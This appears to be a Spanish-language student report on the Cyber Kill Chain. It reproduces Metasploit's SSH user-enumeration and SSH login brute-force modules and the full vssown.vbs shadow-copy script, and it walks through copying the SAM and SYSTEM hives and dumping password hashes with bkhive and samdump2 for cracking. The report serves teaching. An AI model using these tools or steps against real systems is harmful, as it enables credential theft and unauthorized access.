    finish_time = Time.new

    case technique
    when :malformed_packet
      return :success if ssh
    when :timing_attack
      return :success if (finish_time - start_time > threshold)
    end

    :fail
  end

  def rand_pass
    Rex::Text.rand_text_english(64_000..65_000)
  end

  def do_report(ip, user, _port)
    service_data = {
      address: ip,
      port: rport,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Because this isn't using the AuthBrute mixin, we don't have the
  # usual peer method
  def peer(rhost = nil)
    "#{rhost}:#{rport} - SSH -"
  end

  def user_list
    users = []

    users << datastore['USERNAME'] unless datastore['USERNAME'].blank?

    if datastore['USER_FILE']
      fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])
      users += File.read(datastore['USER_FILE']).split
    end

    if datastore['DB_ALL_USERS']
      if framework.db.active
        framework.db.creds(workspace: myworkspace.name).each do |o|
          users << o.public.username if o.public
        end
      else
        print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')
      end
    end

    users.uniq
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
      if attempt_num > 0
        Rex.sleep(2**attempt_num)
        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good("#{peer(ip)} User '#{user}' found")
      do_report(ip, user, rport)
    when :connection_error
      vprint_error("#{peer(ip)} User '#{user}' could not connect")
    when :fail
      vprint_error("#{peer(ip)} User '#{user}' not found")
    end
  end

  def run
    if user_list.empty?
      fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE, USERNAME')
    end

    super
  end

  def run_host(ip)
    print_status("#{peer(ip)} Using #{action.name.downcase} technique")

    if datastore['CHECK_FALSE']
      print_status("#{peer(ip)} Checking for false positives")
      if check_false_positive(ip)
        print_error("#{peer(ip)} throws false positive results. Aborting.")
        return
      end
    end

    users = user_list

    print_status("#{peer(ip)} Starting scan")
    users.each { |user| show_result(attempt_user(user, ip), user, ip) }
  end
end
```

## 9. Investigar el script utilizado en la enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_login). 

Este código es un módulo de Metasploit diseñado en Ruby para **realizar un escaneo de inicios de sesión SSH**. Aquí te explico, en líneas generales, su funcionamiento y propósito:

### Propósito del Módulo

Este módulo tiene como objetivo **probar credenciales de inicio de sesión SSH** en una serie de máquinas, registrando los inicios de sesión exitosos. Es útil para auditores de seguridad y pentesters que buscan identificar acceso no autorizado o vulnerabilidades en la configuración de SSH.

### Funcionamiento General

1. **Configuración Inicial**:
   - Se inicializa el módulo definiendo su nombre, descripción, autor y opciones predeterminadas, como el puerto SSH (22).
   - Se registran opciones avanzadas, como habilitar la depuración y establecer un tiempo de espera para la conexión SSH.

2. **Prueba de Credenciales**:
   - Se construye una colección de credenciales utilizando nombres de usuario y contraseñas proporcionados.
   - Se utiliza un escáner de inicio de sesión SSH para intentar autenticar cada combinación de credenciales en la dirección IP objetivo.

3. **Registro de Resultados**:
   - Si se produce un inicio de sesión exitoso, se registra el acceso y se crea una nueva sesión SSH.
   - Se recopila información sobre el sistema operativo del host y se reporta en la base de datos, si está habilitada.

4. **Gestión de Sesiones**:
   - Si se establece una sesión SSH, se pueden ejecutar comandos en el host remoto y obtener pruebas de acceso.
   - El módulo también maneja errores y situaciones donde no se puede conectar o la autenticación falla.

5. **Mensajes y Reportes**:
   - A medida que se realizan los intentos de inicio de sesión, se imprimen mensajes en la consola para informar sobre el progreso, incluyendo éxitos y fracasos.

### Uso y Aplicaciones

Este módulo es particularmente útil en pruebas de penetración para:
- Evaluar la resistencia de un sistema ante ataques de fuerza bruta en SSH.
- Identificar cuentas de usuario con contraseñas débiles o predeterminadas.
- Monitorear y registrar accesos no autorizados a sistemas críticos.

## 10. Codigo (auxiliary/scanner/ssh/ssh_login)

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'net/ssh/command_stream'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::SSH::Options
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def initialize
    super(
      'Name'           => 'SSH Login Check Scanner',
      'Description'    => %q{
        This module will test ssh logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'         => ['todb'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {'VERBOSE' => false} # Disable annoying connect errors
    )

    register_options(
      [
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),
        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def session_setup(result, scanner)
    return unless scanner.ssh_socket

    platform = scanner.get_platform(result.proof)

    # Create a new session
    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => result.credential.public,
      'PASSWORD'      => result.credential.private
    }
    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
    self.sockets.delete(scanner.ssh_socket.transport.socket)

    # Set the session platform
    s.platform = platform

    # Create database host information
    host_info = {host: scanner.host}

    unless s.platform == 'unknown'
      host_info[:os_name] = s.platform
    end

    report_host(host_info)

    s
  end


  def run_host(ip)
    @ip = ip
    print_brute :ip => ip, :msg => 'Starting bruteforce'

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: cred_collection,
        proxies: datastore['Proxies'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
      )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        credential_data[:private_type] = :password
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        if datastore['CreateSession']
          begin
            session_setup(result, scanner)
          rescue StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute :level => :error, :ip => ip, :msg => "Failed to setup the session - #{e.class} #{e.message}"
          end
        end

        if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
          msg = "While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with"
          msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
          msg << " device details so it can be handled in the future."
          print_brute :level => :error, :ip => ip, :msg => msg
        end
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      else
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end
end

```
# Parte 3: Delivery / Exploitation

La etapa de **Delivery / Exploitation** en la **Kill Chain** se refiere a dos fases cruciales en el proceso de un ataque cibernético. Aquí te explico cada una:

### Delivery (Entrega)

En esta fase, el atacante se enfoca en **entregar el payload malicioso** al objetivo. Esto puede hacerse a través de varios métodos, tales como:

- **Correo Electrónico Phishing**: Envío de correos electrónicos que contienen enlaces o archivos adjuntos maliciosos.
- **Malware en la Web**: Utilización de sitios web comprometidos o maliciosos para infectar a los visitantes.
- **Dispositivos USB**: Distribución física de malware a través de dispositivos de almacenamiento.
- **Redes Sociales**: Compartir enlaces maliciosos en plataformas sociales.

El objetivo es lograr que el usuario objetivo interactúe con el contenido malicioso, lo que podría permitir la ejecución de código malicioso.

### Exploitation (Explotación)

Una vez que el payload ha sido entregado, la fase de explotación implica **ejecutar el malware** para aprovechar una vulnerabilidad en el sistema del objetivo. Esto puede incluir:

- **Ejecutar un Script**: Activar un script malicioso que explota una vulnerabilidad conocida.
- **Inyección de Código**: Insertar código malicioso en aplicaciones vulnerables, como bases de datos o servicios web.
- **Exploits de Software**: Utilizar exploits específicamente diseñados para vulnerabilidades conocidas en software.

El éxito en esta fase permite al atacante obtener acceso no autorizado al sistema, lo que puede llevar a la recopilación de información, la instalación de malware adicional o el control total del sistema.

La etapa de Delivery / Exploitation en Kill Chain es crítica porque:

- **Facilita el acceso inicial** al entorno objetivo.
- Determina la efectividad del ataque en función de la **ingeniería social** y la **exploración de vulnerabilidades**.
- Proporciona el punto de partida para etapas posteriores, como la **Instalación** y **Comando y Control**.

## Video de explicación de Script vssown.vbs

<iframe width="560" height="315" src="https://www.youtube.com/embed/ant3ir9cRME" frameborder="0" allowfullscreen></iframe>
Fuente: [https://www.youtube.com/watch?v=ant3ir9cRME. ](https://www.youtube.com/watch?v=ant3ir9cRME)

En la transcripción, se menciona el script **vssown.vbs** como una herramienta creada por los presentadores para facilitar la manipulación de las **Volume Shadow Copies** en sistemas Windows. Aquí hay algunos puntos clave sobre el script:

- **Funcionalidad:** El script permite a los usuarios crear, eliminar y manipular copias de sombra, así como ejecutar malware oculto en estas copias.

- **Interacción Remota:** Se destaca que el script puede ser utilizado en entornos remotos, lo que significa que un atacante podría ejecutar comandos sin necesidad de acceder físicamente al sistema.

- **Opciones de Comando:** El script incluye varias opciones de comando, como listar copias de sombra, iniciar o detener el servicio de copias de sombra, cambiar el modo del servicio, y ejecutar programas desde las copias de sombra.

- **Facilidad de Uso:** Se menciona que el script está diseñado para ser fácil de usar, permitiendo a los usuarios interactuar con las copias de sombra de manera eficiente y con menos complicaciones que los métodos tradicionales.

- **Precauciones:** Se advierte que se necesita ejecutar el script con privilegios de administrador para que funcione correctamente.

- **Código Abierto y Disponibilidad:** Al final de la presentación, se indica que el script estará disponible para su descarga en el sitio web de Landmaster53, permitiendo a otros usuarios acceder y utilizar la herramienta.

## 11. Proporcionar un breve resumen sobre cómo se puede conciliar malware.
Conciliar el malware en la Kill Chain implica implementar medidas de prevención, detección y respuesta en cada fase del ataque. Esto incluye monitorear actividades sospechosas durante el reconocimiento, utilizar filtrado de contenidos para bloquear correos electrónicos y enlaces maliciosos en la entrega, asegurar que todos los sistemas estén actualizados con parches de seguridad en la explotación, emplear antivirus y antimalware para detectar instalaciones, monitorear el tráfico de red para identificar comunicaciones anómalas con servidores de comando y control, y tener un plan de respuesta a incidentes que contemple contención, erradicación y recuperación de sistemas afectados. Estas acciones ayudan a mitigar el impacto de un ataque y proteger los activos críticos.

## 12.Revisar los siguientes links: [Link1](https://www.sans.org/blog/using-volume-shadow-copies-from-python/) [Link2](https://hackfest.ca/en/blog/2011/recovering-hashes-from-domain-controller). Explicar, según lo descrito en estos blogs, cómo se puede recuperar hashes con el script vssown.vbs.
Para recuperar hashes utilizando el script `vssown.vbs`, se siguen los siguientes pasos, basados en la descripción de los blogs:

- **Acceso a las Copias de Sombra**: El script `vssown.vbs` permite listar las copias de sombra disponibles en el sistema. Primero, se ejecuta el script para obtener una lista de las copias de sombra existentes.

- **Crear una Copia de Sombra**: Si es necesario, se puede crear una nueva copia de sombra utilizando el método `Create` del objeto `Win32_ShadowCopy`. Esto se hace para asegurarse de que tengamos acceso a los archivos más recientes.

- **Acceso a Archivos Específicos**: Una vez que se ha creado o identificado la copia de sombra adecuada, se puede acceder a archivos bloqueados, como los archivos `SYSTEM` y `SAM`, que contienen información sobre los usuarios y sus hashes de contraseñas.

- **Copiar Archivos a un Directorio Accesible**: Usando la interfaz del script, se copian los archivos `SYSTEM` y `SAM` desde la copia de sombra a un directorio accesible, como el directorio del script o un directorio temporal.

- **Extracción de Hashes**: Después de tener los archivos en un lugar accesible, se pueden usar herramientas como `bkhive` y `samdump2` para extraer los hashes de las contraseñas. Estas herramientas permiten procesar los archivos `SYSTEM` y `SAM` para obtener las contraseñas en forma de hashes.

- **Análisis de los Hashes**: Finalmente, los hashes obtenidos pueden ser analizados o crackeados usando técnicas comunes en pruebas de penetración.

## 13. Proporcionar explicación sobre el código de vssown.vbs [Link3](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs).

A continuación el código:
```ruby
REM Volume Shadow Copy Management from CLI.
REM Part of the presentation "Lurking in the Shadows" by Mark Baggett and Tim "LaNMaSteR53" Tomes.
REM Co-developed by Mark Baggett (@MarkBaggett) and Tim Tomes (@lanmaster53).

Set args = WScript.Arguments

if args.Count < 1  Then
  wscript.Echo "Usage: cscript vssown.vbs [option]"
  wscript.Echo
  wscript.Echo "  Options:"
  wscript.Echo
  wscript.Echo "  /list                             - List current volume shadow copies."
  wscript.Echo "  /start                            - Start the shadow copy service."
  wscript.Echo "  /stop                             - Halt the shadow copy service."
  wscript.Echo "  /status                           - Show status of shadow copy service."
  wscript.Echo "  /mode                             - Display the shadow copy service start mode."
  wscript.Echo "  /mode [Manual|Automatic|Disabled] - Change the shadow copy service start mode."
  wscript.Echo "  /create [drive_letter]            - Create a shadow copy."
  wscript.Echo "  /delete [id|*]                    - Delete a specified or all shadow copies."
  wscript.Echo "  /mount [path] [device_object]     - Mount a shadow copy to the given path."
  wscript.Echo "  /execute [\path\to\file]          - Launch executable from within an umounted shadow copy."
  wscript.Echo "  /store                            - Display storage statistics."
  wscript.Echo "  /size [bytes]                     - Set drive space reserved for shadow copies."
  REM build_off
  wscript.Echo "  /build [filename]                 - Print pasteable script to stdout."REM no_build
  REM build_on
  wscript.Quit(0)
End If

strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

Select Case args.Item(0)

  Case "/list"
    Wscript.Echo "SHADOW COPIES"
    Wscript.Echo "============="
    Wscript.Echo
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ShadowCopy")
    For Each objItem in colItems
      Wscript.Echo "[*] ID:                  " & objItem.ID
      Wscript.Echo "[*] Client accessible:   " & objItem.ClientAccessible
      Wscript.Echo "[*] Count:               " & objItem.Count
      Wscript.Echo "[*] Device object:       " & objItem.DeviceObject
      Wscript.Echo "[*] Differential:        " & objItem.Differential
      Wscript.Echo "[*] Exposed locally:     " & objItem.ExposedLocally
      Wscript.Echo "[*] Exposed name:        " & objItem.ExposedName
      Wscript.Echo "[*] Exposed remotely:    " & objItem.ExposedRemotely
      Wscript.Echo "[*] Hardware assisted:   " & objItem.HardwareAssisted
      Wscript.Echo "[*] Imported:            " & objItem.Imported
      Wscript.Echo "[*] No auto release:     " & objItem.NoAutoRelease
      Wscript.Echo "[*] Not surfaced:        " & objItem.NotSurfaced
      Wscript.Echo "[*] No writers:          " & objItem.NoWriters
      Wscript.Echo "[*] Originating machine: " & objItem.OriginatingMachine
      Wscript.Echo "[*] Persistent:          " & objItem.Persistent
      Wscript.Echo "[*] Plex:                " & objItem.Plex
      Wscript.Echo "[*] Provider ID:         " & objItem.ProviderID
      Wscript.Echo "[*] Service machine:     " & objItem.ServiceMachine
      Wscript.Echo "[*] Set ID:              " & objItem.SetID
      Wscript.Echo "[*] State:               " & objItem.State
      Wscript.Echo "[*] Transportable:       " & objItem.Transportable
      Wscript.Echo "[*] Volume name:         " & objItem.VolumeName
      Wscript.Echo
    Next
    wscript.Quit(0)

  Case "/start"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      objService.StartService()
      Wscript.Echo "[*] Signal sent to start the " & objService.Name & " service."
    Next
    wscript.Quit(0)

  Case "/stop"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      objService.StopService()
      Wscript.Echo "[*] Signal sent to stop the " & objService.Name & " service."
    Next
    wscript.Quit(0)

  Case "/status"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      Wscript.Echo "[*] " & objService.State
    Next
    wscript.Quit(0)

  Case "/mode"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      if args.Count < 2 Then
        Wscript.Echo "[*] " & objService.Name & " service set to '" & objService.StartMode & "' start mode."        
      Else
        mode = LCase(args.Item(1))
        if mode = "manual" or mode = "automatic" or mode = "disabled" Then
          errResult = objService.ChangeStartMode(mode)
          Wscript.Echo "[*] " & objService.Name & " service set to '" & mode & "' start mode."
        Else
          Wscript.Echo "[*] '" & mode & "' is not a valid start mode."
        End If
      END If
    Next
    wscript.Quit(errResult)    

  Case "/create"
    VOLUME = args.Item(1) & ":\"
    Const CONTEXT = "ClientAccessible"
    Set objShadowStorage = objWMIService.Get("Win32_ShadowCopy")
    Wscript.Echo "[*] Attempting to create a shadow copy."
    errResult = objShadowStorage.Create(VOLUME, CONTEXT, strShadowID)
    wscript.Quit(errResult)

  Case "/delete"
    id = args.Item(1)
    Set colItems = objWMIService.ExecQuery("Select * From Win32_ShadowCopy")
    For Each objItem in colItems
      if objItem.ID = id Then
        Wscript.Echo "[*] Attempting to delete shadow copy with ID: " & id
        errResult = objItem.Delete_
      ElseIf id = "*" Then
        Wscript.Echo "[*] Attempting to delete shadow copy " & objItem.DeviceObject & "."
        errResult = objItem.Delete_
      End If
    Next
    wscript.Quit(errResult)

  Case "/mount"
    Set WshShell = WScript.CreateObject("WScript.Shell")
    link = args.Item(1)
    sc = args.Item(2) & "\"
    cmd = "cmd /C mklink /D " & link & " " & sc
    WshShell.Run cmd, 2, true
    Wscript.Echo "[*] " & sc & " has been mounted to " & link & "."
    wscript.Quit(0)

  Case "/execute"
    file = args.Item(1)
    Set colItems = objWMIService.ExecQuery("Select * From Win32_ShadowCopy")
    Set objProcess = objWMIService.Get("Win32_Process")
    For Each objItem in colItems
      path = Replace(objItem.DeviceObject,"?",".") & file
      intReturn = objProcess.Create(path)
      if intReturn <> 0 Then
        wscript.Echo "[*] Process could not be created from " & path & "."
        wscript.Echo "[*] ReturnValue = " & intReturn
      Else
        wscript.Echo "[!] Process created from " & path & "."
        wscript.Quit(0)
      End If
    Next
    wscript.Quit(0)

  Case "/store"
    Wscript.Echo "SHADOW STORAGE"
    Wscript.Echo "=============="
    Wscript.Echo
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ShadowStorage")
    For Each objItem in colItems
        Wscript.Echo "[*] Allocated space:     " & FormatNumber(objItem.AllocatedSpace / 1000000,0) & "MB"
        Wscript.Echo "[*] Maximum size:        " & FormatNumber(objItem.MaxSpace / 1000000,0) & "MB"
        Wscript.Echo "[*] Used space:          " & FormatNumber(objItem.UsedSpace / 1000000,0) & "MB"
        Wscript.Echo
    Next
    wscript.Quit(0)

  Case "/size"
    storagesize = CDbl(args.Item(1))
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ShadowStorage")
    For Each objItem in colItems
      objItem.MaxSpace = storagesize
      objItem.Put_
    Next
    Wscript.Echo "[*] Shadow storage space has been set to " & FormatNumber(storagesize / 1000000,0) & "MB."
    wscript.Quit(0)

  REM build_off
  Case "/build"
    build = 1
    Const ForReading = 1
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objTextFile = objFSO.OpenTextFile("vssown.vbs", ForReading)
    Do Until objTextFile.AtEndOfStream
      strNextLine = objTextFile.Readline
      if InStr(strNextLine,"REM build_off") = 3 Then
        build = 0
      End If
      if strNextLine <> "" and build = 1 Then
        strNextLine = Replace(strNextLine,"&","^&")
        strNextLine = Replace(strNextLine,">","^>")
        strNextLine = Replace(strNextLine,"<","^<")
        wscript.Echo "echo " & strNextLine & " >> " & args.Item(1)
      End If
      if InStr(strNextLine,"REM build_on") = 3 Then
        build = 1
      End If
    Loop
    wscript.Quit(0)
  REM build_on

End Select
```
### Explicación del Código `vssown.vbs`

Este código es un script escrito en Visual Basic Script (VBS) que permite gestionar las **Volume Shadow Copies** (copias de sombra) en sistemas Windows desde la línea de comandos. A continuación, se desglosan las partes más importantes del script:

### 1. **Encabezado y Uso**
```vbscript
REM Volume Shadow Copy Management from CLI.
REM Part of the presentation "Lurking in the Shadows" by Mark Baggett and Tim "LaNMaSteR53" Tomes.
```
- El script se utiliza para la gestión de copias de sombra desde la interfaz de línea de comandos.
- Está relacionado con una presentación sobre técnicas de ocultamiento de malware.

### 2. **Argumentos y Ayuda**
```vbscript
Set args = WScript.Arguments

if args.Count < 1  Then
  wscript.Echo "Usage: cscript vssown.vbs [option]"
  wscript.Echo "  Options:"
  wscript.Echo "  /list                             - List current volume shadow copies."
  ...
  wscript.Echo "  /size [bytes]                     - Set drive space reserved for shadow copies."
  wscript.Quit(0)
End If
```
- Se obtienen los argumentos pasados al script. Si no se proporciona ningún argumento, se muestra un mensaje de uso que incluye las opciones disponibles, como listar copias, iniciar/detener el servicio, crear o eliminar copias de sombra, y más.

### 3. **Conexión a WMI**
```vbscript
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
```
- Se establece una conexión con el servicio de gestión de Windows (WMI) para interactuar con la información del sistema.

### 4. **Gestión de Copias de Sombra**
El script utiliza una estructura `Select Case` para manejar diferentes comandos según el argumento proporcionado:

- **Listar Copias de Sombra (`/list`)**
  - Muestra detalles sobre todas las copias de sombra actuales, incluyendo su ID, accesibilidad, y otros atributos.

- **Iniciar/Detener el Servicio (`/start`, `/stop`)**
  - Permite iniciar o detener el servicio de copias de sombra (VSS).

- **Estado del Servicio (`/status`)**
  - Muestra el estado actual del servicio de copias de sombra.

- **Modo del Servicio (`/mode`)**
  - Permite mostrar o cambiar el modo de inicio del servicio (manual, automático, deshabilitado).

- **Crear Copia de Sombra (`/create [drive_letter]`)**
  - Crea una nueva copia de sombra para la unidad especificada.

- **Eliminar Copia de Sombra (`/delete [id|*]`)**
  - Permite eliminar una copia de sombra específica o todas las copias.

- **Montar Copia de Sombra (`/mount [path] [device_object]`)**
  - Monta una copia de sombra en la ruta especificada.

- **Ejecutar desde una Copia de Sombra (`/execute [\path\to\file]`)**
  - Ejecuta un archivo desde dentro de una copia de sombra desmontada.

- **Estadísticas de Almacenamiento (`/store`)**
  - Muestra estadísticas sobre el espacio utilizado y reservado para las copias de sombra.

- **Ajustar Tamaño de Almacenamiento (`/size [bytes]`)**
  - Cambia el espacio en disco reservado para las copias de sombra.

### 5. **Construcción de Script**
```vbscript
  Case "/build"
    ...
    wscript.Quit(0)
```
- Esta sección permite generar un script que puede ser copiado y pegado, facilitando la creación de nuevos scripts basados en el existente.

En resumen, el script `vssown.vbs` proporciona una interfaz para gestionar las copias de sombra en Windows de manera eficiente, permitiendo realizar diversas operaciones que son útiles tanto para administradores de sistema como para profesionales de ciberseguridad. Su capacidad para ejecutar archivos desde copias de sombra lo hace especialmente relevante en contextos de pruebas de penetración y análisis forense.

## 14. Describir qué son los archivos SAM y SYSTEM localizados en la carpeta Windows\System32\Config.

Los archivos `SAM` y `SYSTEM`, localizados en la carpeta `C:\Windows\System32\Config`, son componentes cruciales del sistema operativo Windows:

### Archivo SAM (Security Account Manager)
- **Contenido**: Almacena información sobre las cuentas de usuario y sus contraseñas. Específicamente, contiene los hashes de las contraseñas de los usuarios locales del sistema.
- **Función**: Se utiliza para gestionar la autenticación de usuarios en el sistema. Cuando un usuario intenta iniciar sesión, el sistema compara la contraseña ingresada con los hashes almacenados en este archivo.
- **Acceso**: El archivo SAM está protegido y no puede ser accedido directamente por usuarios normales o aplicaciones sin privilegios elevados, debido a consideraciones de seguridad.

### Archivo SYSTEM
- **Contenido**: Contiene información sobre la configuración del sistema y los componentes de hardware, así como información crítica sobre los controladores y servicios del sistema.
- **Función**: Proporciona la configuración necesaria para que el sistema operativo funcione correctamente, incluyendo detalles sobre el registro de Windows y la estructura de controladores.
- **Acceso**: Similar al archivo SAM, el archivo SYSTEM está protegido y no puede ser modificado directamente sin los permisos adecuados.

### Importancia en la Seguridad
Ambos archivos son esenciales para la seguridad del sistema. Dado que el archivo SAM contiene los hashes de las contraseñas, acceder a él (especialmente junto con el archivo SYSTEM) permite a los atacantes potenciales realizar ataques de fuerza bruta o técnicas de cracking para obtener las contraseñas de los usuarios. Esto es por lo que, en pruebas de penetración, los testers a menudo buscan extraer información de estos archivos para evaluar la seguridad de un sistema.

## 15. ¿Cómo es posible extraer la información contenida en los archivos SAM y SYSTEM?

La extracción de información contenida en los archivos `SAM` y `SYSTEM` generalmente se realiza mediante herramientas y técnicas específicas diseñadas para acceder a los hashes de contraseñas y otros datos. Aquí te explico cómo se puede llevar a cabo este proceso:

### 1. **Acceso a las Copias de Sombra**
   - **Copia de Sombra**: Utilizar herramientas como `vssown.vbs` para crear o acceder a una copia de sombra del sistema. Las copias de sombra permiten obtener versiones de archivos que están en uso, incluyendo `SAM` y `SYSTEM`.

### 2. **Copiar Archivos a un Entorno Accesible**
   - **Extracción**: Una vez que se tiene acceso a la copia de sombra, se copian los archivos `SAM` y `SYSTEM` a un directorio donde se puedan manipular. Esto se puede hacer utilizando scripts o comandos en PowerShell.

### 3. **Herramientas para Extraer Hashes**
   - **bkhive**: Esta herramienta se utiliza para extraer el hash de la contraseña de la cuenta de administrador del archivo `SYSTEM`.
   - **samdump2**: Esta herramienta permite leer el archivo `SAM` y extraer los hashes de las contraseñas de los usuarios.

### 4. **Proceso de Extracción**
   - **Ejecutar bkhive**: Primero, se ejecuta `bkhive` sobre el archivo `SYSTEM` para obtener la clave de cifrado necesaria para acceder a los hashes.
     ```bash
     bkhive SYSTEM > key.txt
     ```
   - **Ejecutar samdump2**: Luego, se utiliza `samdump2` junto con la clave obtenida para extraer los hashes del archivo `SAM`.
     ```bash
     samdump2 SAM key.txt
     ```

### 5. **Análisis de Hashes**
   - **Cracking**: Una vez extraídos, los hashes pueden ser analizados o crackeados utilizando herramientas como `Hashcat` o `John the Ripper` para intentar recuperar las contraseñas en texto claro.

### Consideraciones de Seguridad
- **Privilegios**: Este proceso requiere privilegios elevados, ya que los archivos `SAM` y `SYSTEM` están protegidos por el sistema operativo.
- **Legitimidad**: La extracción de información de estos archivos debe realizarse en un contexto legal y ético, como pruebas de penetración autorizadas.

Este enfoque permite a los profesionales de seguridad obtener información sensible que puede ayudar a evaluar y mejorar la seguridad de un sistema.

## 16. Conclusiones

- La etapa de Reconnaissance es fundamental en el Kill Chain, ya que proporciona la base sobre la cual se construyen las fases posteriores del ataque. Un reconocimiento efectivo puede aumentar significativamente las posibilidades de éxito del atacante, mientras que una falta de información puede llevar a un fracaso en la ejecución de las acciones maliciosas. Por lo tanto, es crucial que las organizaciones implementen medidas de seguridad adecuadas para dificultar esta fase de reconocimiento.

- Ejecutar `nmap` con privilegios de root permite acceder a funciones avanzadas, escanear puertos bien conocidos, detectar sistemas operativos y mejorar la precisión de los resultados, lo que es esencial para un escaneo de red efectivo y completo. Sin embargo, siempre se debe hacer de manera ética y legal, respetando las políticas de red y seguridad.

- El uso de flags combinados en `nmap` permite realizar análisis de red más detallados y eficientes, adaptando los escaneos a necesidades específicas de evaluación de seguridad. Al combinar métodos como `-sS` (SYN Scan) o `-sT` (TCP Connect) con detección de versiones (`-sV`) y de sistemas operativos (`-O`), se obtiene una visión completa del entorno de red, lo que ahorra tiempo y esfuerzo, proporciona información precisa sobre servicios y versiones, y permite una mejor toma de decisiones. Esta flexibilidad y precisión en el escaneo son fundamentales para identificar vulnerabilidades y mantener la seguridad en un entorno cada vez más amenazante.

- En resumen, el flag `--script` en `nmap` es una herramienta poderosa que permite a los usuarios aprovechar los scripts NSE para realizar análisis de seguridad más profundos y específicos, facilitando la detección de vulnerabilidades y la recolección de información valiosa sobre los sistemas evaluados.

- La etapa de Weaponization es crítica en el Kill Chain, ya que establece la base técnica para el ataque. Aquí, el atacante transforma la información recopilada en herramientas y métodos específicos que se emplearán para comprometer el objetivo. Un enfoque cuidadoso en esta fase puede maximizar la efectividad del ataque y facilitar el acceso a los sistemas del objetivo en las etapas posteriores del Kill Chain.

- El código (auxiliary/scanner/ssh/ssh_enumusers) es una herramienta dentro del marco de Metasploit que permite a los profesionales de seguridad realizar pruebas de enumeración de usuarios en servidores SSH, ayudando a identificar posibles vulnerabilidades en la autenticación.

